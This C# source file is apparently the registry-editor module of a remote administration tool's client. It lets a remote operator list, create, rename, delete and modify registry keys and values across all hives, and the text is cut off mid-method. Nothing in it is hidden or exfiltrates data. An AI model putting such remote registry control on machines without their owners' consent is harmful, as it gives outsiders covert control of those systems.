using Client.Models;
using Client.Packets.ClientPackets;
using Client.Packets.ServerPackets;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.Serialization.Formatters.Binary;
using System.Web.Script.Serialization;
using System.Windows.Forms;

namespace Client.Controllers
{
    /*
    * Derived and Adapted By Justin Yanke
    * github: https://github.com/yankejustin
    * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    * This code is created by Justin Yanke and has only been
    * modified partially.
    * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    * Modified by StingRaptor on January 21, 2016
    * Modified by StingRaptor on March 15, 2016
    * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    */

    static class RegistryEditorController
    {

        public static void getRegistryKey(DoLoadRegistryKey packet, ClientMosaique client)
        {
            try
            {
                RegistrySeeker seeker = new RegistrySeeker();
                seeker.BeginSeeking(packet.rootKeyName);                

                new GetRegistryKeysResponse(seeker.Matches, packet.rootKeyName, false, "").Execute(client);  
            }
            catch (Exception e)
            {
                System.Windows.Forms.MessageBox.Show(e.ToString());

                //responsePacket.isError = true;
                //responsePacket.errorMsg = e.Message;
                //new GetRegistryKeysResponse(ObjectToByteArray(seeker.Matches), packet.rootKeyName, true, e.Message).Execute(client);
            }
            //responsePacket.rootKey = packet.rootKeyName;
            //responsePacket.Execute(client);
        }       

        public static void createRegistryKey(DoCreateRegistryKey packet, ClientMosaique client)
        {
            GetCreateRegistryKeyResponse responsePacket = new GetCreateRegistryKeyResponse();
            string errorMsg = "";
            string newKeyName = "";
            try
            {
                responsePacket.IsError = !(RegistryEditor.CreateRegistryKey(packet.parentPath, out newKeyName, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;

            responsePacket.Match = new RegSeekerMatch(newKeyName, RegistryKeyHelper.GetDefaultValues(), 0);
            responsePacket.ParentPath = packet.parentPath;

            responsePacket.Execute(client);
        }

        public static void renameRegistryKey(DoRenameRegistryKey packet, ClientMosaique client)
        {
            GetRenameRegistryKeyResponse responsePacket = new GetRenameRegistryKeyResponse();
            string errorMsg = "";
            try
            {
                responsePacket.IsError = !(RegistryEditor.RenameRegistryKey(packet.OldKeyName, packet.NewKeyName, packet.ParentPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.ParentPath = packet.ParentPath;
            responsePacket.OldKeyName = packet.OldKeyName;
            responsePacket.NewKeyName = packet.NewKeyName;

            responsePacket.Execute(client);
        }

        public static void deleteRegistryKey(DoDeleteRegistryKey packet, ClientMosaique client)
        {
            GetDeleteRegistryKeyResponse responsePacket = new GetDeleteRegistryKeyResponse();
            string errorMsg = "";
            try
            {
                responsePacket.IsError = !(RegistryEditor.DeleteRegistryKey(packet.keyName, packet.parentPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.ParentPath = packet.parentPath;
            responsePacket.KeyName = packet.keyName;

            responsePacket.Execute(client);
        }

        public static void createRegistryValue(DoCreateRegistryValue packet, ClientMosaique client)
        {
            GetCreateRegistryValueResponse responsePacket = new GetCreateRegistryValueResponse();
            string errorMsg = "";
            string newKeyName = "";
            try
            {
                responsePacket.IsError = !(RegistryEditor.CreateRegistryValue(packet.keyPath, packet.kind, out newKeyName, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }

            

            responsePacket.ErrorMsg = errorMsg;
            responsePacket.Value = new RegValueData(newKeyName, packet.kind, new JavaScriptSerializer().Serialize(packet.kind.GetDefault()));
            responsePacket.KeyPath = packet.keyPath;

            responsePacket.Execute(client);
        }

        public static void renameRegistryValue(DoRenameRegistryValue packet, ClientMosaique client)
        {
            GetRenameRegistryValueResponse responsePacket = new GetRenameRegistryValueResponse();
            string errorMsg = "";
            try
            {
                responsePacket.IsError = !(RegistryEditor.RenameRegistryValue(packet.oldValueName, packet.newValueName, packet.keyPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.KeyPath = packet.keyPath;
            responsePacket.OldValueName = packet.oldValueName;
            responsePacket.NewValueName = packet.newValueName;

            responsePacket.Execute(client);
        }

        public static void changeRegistryValue(DoChangeRegistryValue packet, ClientMosaique client)
        {
            GetChangeRegistryValueResponse responsePacket = new GetChangeRegistryValueResponse();
            string errorMsg = "";

            try
            {
                responsePacket.IsError = !(RegistryEditor.ChangeRegistryValue(packet.Value, packet.KeyPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            if(packet.Value.Kind == RegistryValueKind.String || packet.Value.Kind == RegistryValueKind.ExpandString)
                packet.Value.Data = new JavaScriptSerializer().Serialize(packet.Value.Data);

            if (packet.Value.Kind == RegistryValueKind.Binary)
                packet.Value.Data = new JavaScriptSerializer().Serialize(packet.Value.Data);

            if (packet.Value.Kind == RegistryValueKind.MultiString)
                packet.Value.Data = new JavaScriptSerializer().Serialize(packet.Value.Data);


            responsePacket.ErrorMsg = errorMsg;
            responsePacket.KeyPath = packet.KeyPath;
            responsePacket.Value = packet.Value;

            responsePacket.Execute(client);
        }

        public static void deleteRegistryValue(DoDeleteRegistryValue packet, ClientMosaique client)
        {
            GetDeleteRegistryValueResponse responsePacket = new GetDeleteRegistryValueResponse();
            string errorMsg = "";
            try
            {
                responsePacket.IsError = !(RegistryEditor.DeleteRegistryValue(packet.keyPath, packet.valueName, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.ValueName = packet.valueName;
            responsePacket.KeyPath = packet.keyPath;

            responsePacket.Execute(client);
        }

    }

    public class RegistrySeeker
    {

        #region Fields

        /// <summary>
        /// The lock used to ensure thread safety.
        /// </summary>
        private readonly object locker = new object();

        /// <summary>
        /// The list containing the matches found during the search.
        /// </summary>
        private List<RegSeekerMatch> matches;

        public RegSeekerMatch[] Matches
        {
            get
            {
                if (matches != null)
                    return matches.ToArray();
                return null;
            }
        }

        #endregion

        public RegistrySeeker()
        {
            matches = new List<RegSeekerMatch>();
        }

        public void BeginSeeking(string rootKeyName)
        {
            if (!String.IsNullOrEmpty(rootKeyName))
            {
                using (RegistryKey root = GetRootKey(rootKeyName))
                {
                    //Check if this is a root key or not
                    if (root != null && root.Name != rootKeyName)
                    {
                        //Must get the subKey name by removing root and '\'
                        string subKeyName = rootKeyName.Substring(root.Name.Length + 1);
                        using (RegistryKey subroot = root.OpenReadonlySubKeySafe(subKeyName))
                        {
                            if (subroot != null)
                                Seek(subroot);
                        }
                    }
                    else
                    {
                        Seek(root);
                    }
                }
            }
            else
            {
                Seek(null);
            }
        }

        private void Seek(RegistryKey rootKey)
        {
            // Get root registrys
            if (rootKey == null)
            {
                foreach (RegistryKey key in GetRootKeys())
                    //Just need root key so process it
                    ProcessKey(key, key.Name);
            }
            else
            {
                //searching for subkeys to root key
                Search(rootKey);
            }
        }

        private void Search(RegistryKey rootKey)
        {
            foreach (string subKeyName in rootKey.GetSubKeyNames())
            {
                RegistryKey subKey = rootKey.OpenReadonlySubKeySafe(subKeyName);
                ProcessKey(subKey, subKeyName);
            }
        }

        private void ProcessKey(RegistryKey key, string keyName)
        {
            if (key != null)
            {
                List<RegValueData> values = new List<RegValueData>();

                foreach (string valueName in key.GetValueNames())
                {
                    RegistryValueKind valueType = key.GetValueKind(valueName);
                    object valueData = key.GetValue(valueName);
                    values.Add(new RegValueData(valueName, valueType, new JavaScriptSerializer().Serialize(valueData)));
                }

                AddMatch(keyName, RegistryKeyHelper.AddDefaultValue(values), key.SubKeyCount);
            }
            else
            {
                AddMatch(keyName, RegistryKeyHelper.GetDefaultValues(), 0);
            }

        }

        private void AddMatch(string key, RegValueData[] values, int subkeycount)
        {
            RegSeekerMatch match = new RegSeekerMatch(key, values, subkeycount);

            matches.Add(match);
        }

        public static RegistryKey GetRootKey(string subkeyFullPath)
        {
            string[] path = subkeyFullPath.Split('\\');
            try
            {
                switch (path[0]) // <== root;
                {
                    case "HKEY_CLASSES_ROOT":
                        return RegistryKey.OpenBaseKey(RegistryHive.ClassesRoot, RegistryView.Registry64);
                    case "HKEY_CURRENT_USER":
                        return RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
                    case "HKEY_LOCAL_MACHINE":
                        return RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
                    case "HKEY_USERS":
                        return RegistryKey.OpenBaseKey(RegistryHive.Users, RegistryView.Registry64);
                    case "HKEY_CURRENT_CONFIG":
                        return RegistryKey.OpenBaseKey(RegistryHive.CurrentConfig, RegistryView.Registry64);
                    default:
                        /* If none of the above then the key must be invalid */
                        throw new Exception("Invalid rootkey, could not be found.");
                }
            }
            catch (SystemException)
            {
                throw new Exception("Unable to open root registry key, you do not have the needed permissions.");
            }
            catch (Exception e)
            {
                throw e;
            }
        }

        public static List<RegistryKey> GetRootKeys()
        {
            List<RegistryKey> rootKeys = new List<RegistryKey>();
            try
            {
                rootKeys.Add(RegistryKey.OpenBaseKey(RegistryHive.ClassesRoot, RegistryView.Registry64));
                rootKeys.Add(RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64));
                rootKeys.Add(RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64));
                rootKeys.Add(RegistryKey.OpenBaseKey(RegistryHive.Users, RegistryView.Registry64));
                rootKeys.Add(RegistryKey.OpenBaseKey(RegistryHive.CurrentConfig, RegistryView.Registry64));
            }
            catch (SystemException)
            {
                throw new Exception("Could not open root registry keys, you may not have the needed permission");
            }
            catch (Exception e)
            {
                throw e;
            }

            return rootKeys;
        }
    }

    public static class RegistryKeyHelper
    {
        private static string DEFAULT_VALUE = String.Empty;

        /// <summary>
        /// Adds a value to the registry key.
        /// </summary>
        /// <param name="hive">Represents the possible values for a top-level node on a foreign machine.</param>
        /// <param name="path">The path to the registry key.</param>
        /// <param name="name">The name of the value.</param>
        /// <param name="value">The value.</param>
        /// <param name="addQuotes">If set to True, adds quotes to the value.</param>
        /// <returns>True on success, else False.</returns>
        public static bool AddRegistryKeyValue(RegistryHive hive, string path, string name, string value, bool addQuotes = false)
        {
            try
            {
                using (RegistryKey key = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenWritableSubKeySafe(path))
                {
                    if (key == null) return false;

                    if (addQuotes && !value.StartsWith("\"") && !value.EndsWith("\""))
                        value = "\"" + value + "\"";

                    key.SetValue(name, value);
                    return true;
                }
            }
            catch (Exception)
            {
                return false;
            }
        }

        /// <summary>
        /// Opens a read-only registry key.
        /// </summary>
        /// <param name="hive">Represents the possible values for a top-level node on a foreign machine.</param>
        /// <param name="path">The path to the registry key.</param>
        /// <returns></returns>
        public static RegistryKey OpenReadonlySubKey(RegistryHive hive, string path)
        {
            try
            {
                return RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenSubKey(path, false);
            }
            catch
            {
                return null;
            }
        }

        /// <summary>
        /// Deletes the specified value from the registry key.
        /// </summary>
        /// <param name="hive">Represents the possible values for a top-level node on a foreign machine.</param>
        /// <param name="path">The path to the registry key.</param>
        /// <param name="name">The name of the value to delete.</param>
        /// <returns>True on success, else False.</returns>
        public static bool DeleteRegistryKeyValue(RegistryHive hive, string path, string name)
        {
            try
            {
                using (RegistryKey key = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenWritableSubKeySafe(path))
                {
                    if (key == null) return false;
                    key.DeleteValue(name, true);
                    return true;
                }
            }
            catch (Exception)
            {
                return false;
            }
        }

        /// <summary>
        /// Checks if the provided value is the default value
        /// </summary>
        /// <param name="valueName">The name of the value</param>
        /// <returns>True if default value, else False</returns>
        public static bool IsDefaultValue(string valueName)
        {
            return String.IsNullOrEmpty(valueName);
        }

        /// <summary>
        /// Adds the default value to the list of values and returns them as an array. 
        /// If default value already exists this function will only return the list as an array.
        /// </summary>
        /// <param name="values">The list with the values for which the default value should be added to</param>
        /// <returns>Array with all of the values including the default value</returns>
        public static RegValueData[] AddDefaultValue(List<RegValueData> values)
        {
            if (!values.Any(value => IsDefaultValue(value.Name)))
            {
                values.Add(GetDefaultValue());
            }
            return values.ToArray();
        }

        /// <summary>
        /// Gets the default registry values
        /// </summary>
        /// <returns>A array with the default registry values</returns>
        public static RegValueData[] GetDefaultValues()
        {
            return new RegValueData[] { GetDefaultValue() };
        }

        private static RegValueData GetDefaultValue()
        {
             return new RegValueData(DEFAULT_VALUE, RegistryValueKind.String, null);
        }
    }

    public static class RegistryKeyExtensions
    {
        /// <summary>
        /// Determines if the registry key by the name provided is null or has the value of null.
        /// </summary>
        /// <param name="keyName">The name associated with the registry key.</param>
        /// <param name="key">The actual registry key.</param>
        /// <returns>True if the provided name is null or empty, or the key is null; False if otherwise.</returns>
        private static bool IsNameOrValueNull(this string keyName, RegistryKey key)
        {
            return (string.IsNullOrEmpty(keyName) || (key == null));
        }

        /// <summary>
        /// Attempts to get the string value of the key using the specified key name. This method assumes
        /// correct input.
        /// </summary>
        /// <param name="key">The key of which we obtain the value of.</param>
        /// <param name="keyName">The name of the key.</param>
        /// <param name="defaultValue">The default value if value can not be determinated.</param>
        /// <returns>Returns the value of the key using the specified key name. If unable to do so,
        /// defaultValue will be returned instead.</returns>
        public static string GetValueSafe(this RegistryKey key, string keyName, string defaultValue = "")
        {
            try
            {
                return key.GetValue(keyName, defaultValue).ToString();
            }
            catch
            {
                return defaultValue;
            }
        }

        /// <summary>
        /// Attempts to obtain a readonly (non-writable) sub key from the key provided using the
        /// specified name. Exceptions thrown will be caught and will only return a null key.
        /// This method assumes the caller will dispose of the key when done using it.
        /// </summary>
        /// <param name="key">The key of which the sub key is obtained from.</param>
        /// <param name="name">The name of the sub-key.</param>
        /// <returns>Returns the sub-key obtained from the key and name provided; Returns null if
        /// unable to obtain a sub-key.</returns>
        public static RegistryKey OpenReadonlySubKeySafe(this RegistryKey key, string name)
        {
            try
            {
                return key.OpenSubKey(name, false);
            }
            catch
            {
                return null;
            }
        }

        /// <summary>
        /// Attempts to obtain a writable sub key from the key provided using the specified
        /// name. This method assumes the caller will dispose of the key when done using it.
        /// </summary>
        /// <param name="key">The key of which the sub key is obtained from.</param>
        /// <param name="name">The name of the sub-key.</param>
        /// <returns>Returns the sub-key obtained from the key and name provided; Returns null if
        /// unable to obtain a sub-key.</returns>
        public static RegistryKey OpenWritableSubKeySafe(this RegistryKey key, string name)
        {
            try
            {
                return key.OpenSubKey(name, true);
            }
            catch
            {
                return null;
            }
        }

        /// <summary>
        /// Attempts to create a sub key from the key provided using the specified
        /// name. This method assumes the caller will dispose of the key when done using it.
        /// </summary>
        /// <param name="key">The key of which the sub key is to be created from.</param>
        /// <param name="name">The name of the sub-key.</param>
        /// <returns>Returns the sub-key that was created for the key and name provided; Returns null if
        /// unable to create a sub-key.</returns>
        public static RegistryKey CreateSubKeySafe(this RegistryKey key, string name)
        {
            try
            {
                return key.CreateSubKey(name);
            }
            catch
            {
                return null;
            }
        }

        /// <summary>
        /// Attempts to delete a sub-key and its children from the key provided using the specified
        /// name.
        /// </summary>
        /// <param name="key">The key of which the sub-key is to be deleted from.</param>
        /// <param name="name">The name of the sub-key.</param>
        /// <returns>Returns boolean value if the action succeded or failed
        /// </returns>
        public static bool DeleteSubKeyTreeSafe(this RegistryKey key, string name)
        {
            try
            {
                key.DeleteSubKeyTree(name, true);
                return true;
            }
            catch
            {
                return false;
            }
        }

        #region Rename Key

        /*
        * Derived and Adapted from drdandle's article, 
        * Copy and Rename Registry Keys at Code project.
        * Copy and Rename Registry Keys (Post Date: November 11, 2006)
        * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        * This is a work that is not of the original. It
        * has been modified to suit the needs of another
        * application.
        * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        * First Modified by StingRaptor on January 21, 2016
        * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        * Original Source:
        * http://www.codeproject.com/Articles/16343/Copy-and-Rename-Registry-Keys
        */

        /// <summary>
        /// Attempts to rename a sub-key to the key provided using the specified old
        /// name and new name.
        /// </summary>
        /// <param name="key">The key of which the subkey is to be renamed from.</param>
        /// <param name="oldName">The old name of the sub-key.</param>
        /// <param name="newName">The new name of the sub-key.</param>
        /// <returns>Returns boolean value if the action succeded or failed; Returns 
        /// </returns>
        public static bool RenameSubKeySafe(this RegistryKey key, string oldName, string newName)
        {
            try
            {
                //Copy from old to new
                key.CopyKey(oldName, newName);
                //Despose of the old key
                key.DeleteSubKeyTree(oldName);
                return true;
            }
            catch
            {
                //Try to despose of the newKey (The rename failed)
                key.DeleteSubKeyTreeSafe(newName);
                return false;
            }
        }

        /// <summary>
        /// Attempts to copy a old subkey to a new subkey for the key 
        /// provided using the specified old name and new name. (throws exceptions)
        /// </summary>
        /// <param name="key">The key of which the subkey is to be deleted from.</param>
        /// <param name="oldName">The old name of the sub-key.</param>
        /// <param name="newName">The new name of the sub-key.</param>
        /// <returns>Returns nothing 
        /// </returns>
        public static void CopyKey(this RegistryKey key, string oldName, string newName)
        {
            //Create a new key
            using (RegistryKey newKey = key.CreateSubKey(newName))
            {
                //Open old key
                using (RegistryKey oldKey = key.OpenSubKey(oldName, true))
                {
                    //Copy from old to new
                    RecursiveCopyKey(oldKey, newKey);
                }
            }
        }

        /// <summary>
        /// Attempts to rename a sub-key to the key provided using the specified old
        /// name and new name.
        /// </summary>
        /// <param name="sourceKey">The source key to copy from.</param>
        /// <param name="destKey">The destination key to copy to.</param>
        /// <returns>Returns nothing 
        /// </returns>
        private static void RecursiveCopyKey(RegistryKey sourceKey, RegistryKey destKey)
        {

            //Copy all of the registry values
            foreach (string valueName in sourceKey.GetValueNames())
            {
                object valueObj = sourceKey.GetValue(valueName);
                RegistryValueKind valueKind = sourceKey.GetValueKind(valueName);
                destKey.SetValue(valueName, valueObj, valueKind);
            }

            //Copy all of the subkeys
            foreach (string subKeyName in sourceKey.GetSubKeyNames())
            {
                using (RegistryKey sourceSubkey = sourceKey.OpenSubKey(subKeyName))
                {
                    using (RegistryKey destSubKey = destKey.CreateSubKey(subKeyName))
                    {
                        //Recursive call to copy the sub key data
                        RecursiveCopyKey(sourceSubkey, destSubKey);
                    }
                }
            }
        }

        #endregion

        #region Region Value

        /// <summary>
        /// Attempts to set a registry value for the key provided using the specified
        /// name, data and kind. If the registry value does not exist it will be created
        /// </summary>
        /// <param name="key">The key of which the value is to be set for.</param>
        /// <param name="name">The name of the value.</param>
        /// <param name="data">The data of the value</param>
        /// <param name="kind">The value kind of the value</param>
        /// <returns>Returns a boolean value if the action succeded or failed.</returns>
        public static bool SetValueSafe(this RegistryKey key, string name, object data, RegistryValueKind kind)
        {
            try
            {
                key.SetValue(name, data, kind);
                return true;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Attempts to delete a registry value for the key provided using the specified
        /// name.
        /// </summary>
        /// <param name="key">The key of which the value is to be delete from.</param>
        /// <param name="name">The name of the value.</param>
        /// <returns>Returns a boolean value if the action succeded or failed.</returns>
        public static bool DeleteValueSafe(this RegistryKey key, string name)
        {
            try
            {
                key.DeleteValue(name);
                return true;
            }
            catch
            {
                return false;
            }
        }

        #region Rename Value

        /// <summary>
        /// Attempts to rename a registry value to the key provided using the specified old
        /// name and new name.
        /// </summary>
        /// <param name="key">The key of which the registry value is to be renamed from.</param>
        /// <param name="oldName">The old name of the registry value.</param>
        /// <param name="newName">The new name of the registry value.</param>
        /// <returns>Returns boolean value if the action succeded or failed; Returns 
        /// </returns>
        public static bool RenameValueSafe(this RegistryKey key, string oldName, string newName)
        {
            try
            {
                //Copy from old to new
                key.CopyValue(oldName, newName);
                //Despose of the old value
                key.DeleteValue(oldName);
                return true;
            }
            catch
            {
                //Try to despose of the newKey (The rename failed)
                key.DeleteValueSafe(newName);
                return false;
            }
        }

        /// <summary>
        /// Attempts to copy a old registry value to a new registry value for the key 
        /// provided using the specified old name and new name. (throws exceptions)
        /// </summary>
        /// <param name="key">The key of which the registry value is to be copied.</param>
        /// <param name="oldName">The old name of the registry value.</param>
        /// <param name="newName">The new name of the registry value.</param>
        /// <returns>Returns nothing 
        /// </returns>
        public static void CopyValue(this RegistryKey key, string oldName, string newName)
        {
            RegistryValueKind valueKind = key.GetValueKind(oldName);
            object valueData = key.GetValue(oldName);

            key.SetValue(newName, valueData, valueKind);
        }

        #endregion

        #endregion

        #region Find

        /// <summary>
        /// Checks if the specified subkey exists in the key
        /// </summary>
        /// <param name="key">The key of which to search.</param>
        /// <param name="name">The name of the sub-key to find.</param>
        /// <returns>Returns boolean value if the action succeded or failed
        /// </returns>
        public static bool ContainsSubKey(this RegistryKey key, string name)
        {
            foreach (string subkey in key.GetSubKeyNames())
            {
                if (subkey == name)
                {
                    return true;
                }
            }
            return false;
        }

        /// <summary>
        /// Checks if the specified registry value exists in the key
        /// </summary>
        /// <param name="key">The key of which to search.</param>
        /// <param name="name">The name of the registry value to find.</param>
        /// <returns>Returns boolean value if the action succeded or failed
        /// </returns>
        public static bool ContainsValue(this RegistryKey key, string name)
        {
            foreach (string value in key.GetValueNames())
            {
                if (value == name)
                {
                    return true;
                }
            }
            return false;
        }

        #endregion

        /// <summary>
        /// Gets all of the value names associated with the registry key and returns
        /// formatted strings of the filtered values.
        /// </summary>
        /// <param name="key">The registry key of which the values are obtained.</param>
        /// <returns>Yield returns formatted strings of the key and the key value.</returns>
        public static IEnumerable<string> GetFormattedKeyValues(this RegistryKey key)
        {
            if (key == null) yield break;

            foreach (var k in key.GetValueNames().Where(keyVal => !keyVal.IsNameOrValueNull(key)).Where(k => !string.IsNullOrEmpty(k)))
            {
                yield return string.Format("{0}||{1}", k, key.GetValueSafe(k));
            }
        }

        public static object GetDefault(this RegistryValueKind valueKind)
        {
            switch (valueKind)
            {
                case RegistryValueKind.Binary:
                    return new byte[] { };
                case RegistryValueKind.MultiString:
                    return new string[] { };
                case RegistryValueKind.DWord:
                    return 0;
                case RegistryValueKind.QWord:
                    return (long)0;
                case RegistryValueKind.String:
                case RegistryValueKind.ExpandString:
                    return "";
                default:
                    return null;
            }
        }
    }

    public class RegistryEditor
    {

        #region CONSTANTS

        #region RegistryKey

        private const string REGISTRY_KEY_CREATE_ERROR = "Cannot create key: Error writing to the registry";

        private const string REGISTRY_KEY_DELETE_ERROR = "Cannot delete key: Error writing to the registry";

        private const string REGISTRY_KEY_RENAME_ERROR = "Cannot rename key: Error writing to the registry";

        #endregion

        #region RegistryValue

        private const string REGISTRY_VALUE_CREATE_ERROR = "Cannot create value: Error writing to the registry";

        private const string REGISTRY_VALUE_DELETE_ERROR = "Cannot delete value: Error writing to the registry";

        private const string REGISTRY_VALUE_RENAME_ERROR = "Cannot rename value: Error writing to the registry";

        private const string REGISTRY_VALUE_CHANGE_ERROR = "Cannot change value: Error writing to the registry";

        #endregion

        #endregion

        #region RegistryKey
        /// <summary>
        /// Attempts to create the desired sub key to the specified parent.
        /// </summary>
        /// <param name="parentPath">The path to the parent for which to create the sub-key on.</param>
        /// <param name="name">output parameter that holds the name of the sub-key that was create.</param>
        /// <param name="errorMsg">output parameter that contians possible error message.</param>
        /// <returns>Returns true if action succeeded.</returns>
        public static bool CreateRegistryKey(string parentPath, out string name, out string errorMsg)
        {
            name = "";
            try
            {
                RegistryKey parent = GetWritableRegistryKey(parentPath);


                //Invalid can not open parent
                if (parent == null)
                {
                    errorMsg = "You do not have write access to registry: " + parentPath + ", try running client as administrator";
                    return false;
                }

                //Try to find available names
                int i = 1;
                string testName = String.Format("New Key #{0}", i);

                while (parent.ContainsSubKey(testName))
                {
                    i++;
                    testName = String.Format("New Key #{0}", i);
                }
                name = testName;

                using (RegistryKey child = parent.CreateSubKeySafe(name))
                {
                    //Child could not be created
                    if (child == null)
                    {
                        errorMsg = REGISTRY_KEY_CREATE_ERROR;
                        return false;
                    }
                }

                //Child was successfully created
                errorMsg = "";
                return true;
            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                return false;
            }

        }

        /// <summary>
        /// Attempts to delete the desired sub-key from the specified parent.
        /// </summary>
        /// <param name="name">The name of the sub-key to delete.</param>
        /// <param name="parentPath">The path to the parent for which to delete the sub-key on.</param>
        /// <param name="errorMsg">output parameter that contians possible error message.</param>
        /// <returns>Returns true if the operation succeeded.</returns>
        public static bool DeleteRegistryKey(string name, string parentPath, out string errorMsg)
        {
            try
            {
                RegistryKey parent = GetWritableRegistryKey(parentPath);

                //Invalid can not open parent
                if (parent == null)
                {
                    errorMsg = "You do not have write access to registry: " + parentPath + ", try running client as administrator";
                    return false;
                }

                //Child does not exist
                if (!parent.ContainsSubKey(name))
                {
                    errorMsg = "The registry: " + name + " does not exist in: " + parentPath;
                    //If child does not exists then the action has already succeeded
                    return true;
                }

                bool success = parent.DeleteSubKeyTreeSafe(name);

                //Child could not be deleted
                if (!success)
                {
                    errorMsg = REGISTRY_KEY_DELETE_ERROR;
                    return false;
                }

                //Child was successfully deleted
                errorMsg = "";
                return true;
            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                return false;
            }
        }

        /// <summary>
        /// Attempts to rename the desired key.
        /// </summary>
        /// <param name="oldName">The name of the key to rename.</param>
        /// <param name="newName">The name to use for renaming.</param>
        /// <param name="parentPath">The path of the parent for which to rename the key.</param>
        /// <param name="errorMsg">output parameter that contians possible error message.</param>
        /// <returns>Returns true if the operation succeeded.</returns>
        public static bool RenameRegistryKey(string oldName, string newName, string parentPath, out string errorMsg)
        {
            try
            {

                RegistryKey parent = GetWritableRegistryKey(parentPath);

                //Invalid can not open parent
                if (parent == null)
                {
                    errorMsg = "You do not have write access to registry: " + parentPath + ", try running client as administrator";
                    return false;
                }

                //Child does not exist
                if (!parent.ContainsSubKey(oldName))
                {
                    errorMsg = "The registry: " + oldName + " does not exist in: " + parentPath;
                    return false;
                }

                bool success = parent.RenameSubKeySafe(oldName, newName);

                //Child could not be renamed
                if (!success)
                {
                    errorMsg = REGISTRY_KEY_RENAME_ERROR;
                    return false;
                }

                //Child was successfully renamed
                errorMsg = "";
                return true;

            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                return false;
            }
        }

        #endregion

        #region RegistryValue

        /// <summary>
        /// Attempts to create the desired value for the specified parent.
        /// </summary>
        /// <param name="keyPath">The path to the key for which to create the registry value on.</param>
        /// <param name="kind">The type of the registry value to create.</param>
        /// <param name="name">output parameter that holds the name of the registry value that was create.</param>
        /// <param name="errorMsg">output parameter that contians possible error message.</param>
        /// <returns>Returns true if the operation succeeded.</returns>
        public static bool CreateRegistryValue(string keyPath, RegistryValueKind kind, out string name, out string errorMsg)
        {
            name = "";
            try
            {
                RegistryKey key = GetWritableRegistryKey(keyPath);

                //Invalid can not open key
                if (key == null)
                {
                    errorMsg = "You do not have write access to registry: " + keyPath + ", try running client as administrator";
                    return false;
                }

                //Try to find available names
                int i = 1;
                string testName = String.Format("New Value #{0}", i);

                while (key.ContainsValue(testName))
                {
                    i++;
                    testName = String.Format("New Value #{0}", i);
                }
                name = testName;

                bool success = key.SetValueSafe(name, kind.GetDefault(), kind);

                //Value could not be created
                if (!success)
                {
                    errorMsg = REGISTRY_VALUE_CREATE_ERROR;
                    return false;
                }

                //Value was successfully created
                errorMsg = "";
                return true;
            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                return false;
            }

        }

        /// <summary>
        /// Attempts to delete the desired registry value from the specified key.
        /// </summary>
        /// <param name="keyPath">The path to the key for which to delete the registry value on.</param>
        /// /// <param name="name">The name of the registry value to delete.</param>
        /// <param name="errorMsg">output parameter that contians possible error message.</param>
        /// <returns>Returns true if the operation succeeded.</returns>
        public static bool DeleteRegistryValue(string keyPath, string name, out string errorMsg)
        {
            try
            {
                RegistryKey key = GetWritableRegistryKey(keyPath);

                //Invalid can not open key
                if (key == null)
                {
                    errorMsg = "You do not have write access to registry: " + keyPath + ", try running client as administrator";
                    return false;
                }

                //Value does not exist
                if (!key.ContainsValue(name))
                {
                    errorMsg = "The value: " + name + " does not exist in: " + keyPath;
                    //If value does not exists then the action has already succeeded
                    return true;
                }

                bool success = key.DeleteValueSafe(name);

                //Value could not be deleted
                if (!success)
                {
                    errorMsg = REGISTRY_VALUE_DELETE_ERROR;
                    return false;
                }

                //Value was successfully deleted
                errorMsg = "";
                return true;
            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                return false;
            }
        }

        /// <summary>
        /// Attempts to rename the desired registry value.
        /// </summary>
        /// <param name="oldName">The name of the registry value to rename.</param>
        /// <param name="newName">The name to use for renaming.</param>
        /// <param name="keyPath">The path of the key for which to rename the registry value.</param>
        /// <param name="errorMsg">output parameter that contians possible error message.</param>
        /// <returns>Returns true if the operation succeeded.</returns>
        public static bool RenameRegistryValue(string oldName, string newName, string keyPath, out string errorMsg)
        {
            try
            {
                RegistryKey key = GetWritableRegistryKey(keyPath);

                //Invalid can not open key
                if (key == null)
                {
                    errorMsg = "You do not have write access to registry: " + keyPath + ", try running client as administrator";
                    return false;
                }

                //Value does not exist
                if (!key.ContainsValue(oldName))
                {
